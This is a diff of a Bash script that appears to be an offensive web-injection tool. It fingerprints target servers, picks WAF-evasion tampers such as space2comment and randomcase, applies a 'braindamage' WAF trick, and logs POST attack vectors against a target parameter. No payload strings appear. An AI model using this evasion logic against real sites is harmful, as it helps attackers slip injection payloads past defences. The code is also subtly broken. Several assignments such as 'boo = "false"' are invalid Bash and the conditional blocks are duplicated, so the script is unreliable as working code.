@@ -191,8 +191,8 @@ local boo = "true"
          if [ "$boo" = "true" ]; then
          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
             active_payload="$t4"
-            echo "[i] This web is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded (Space2comment, randomcase only).\n"
-boo = "false"
+            echo "[i](1) This web is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded (Space2comment, randomcase only).\n"
+boo="false"
           else
      active_payload="$defiance_tamper_path"
 boo = "false"
@@ -299,12 +299,17 @@ local current_time=$(date +%H:%M:%S)
             fi
             local waf_trick=$(braindamage)
         local clean_target_url="${target_url%%\?*}"
-if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-    active_payload="$t4"
-else
-    active_payload="$defiance_tamper_path"
+local boo = "true"
+         if [ "$boo" = "true" ]; then
+         if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+            active_payload="$t4"
+            echo "[i](2) This web is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded (Space2comment, randomcase only).\n"
+boo="false"
+          else
+     active_payload="$defiance_tamper_path"
+boo = "false"
+          fi
 fi
-
           if [ "$REQ_METHOD" = "POST" ]; then
             
             echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM  \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"
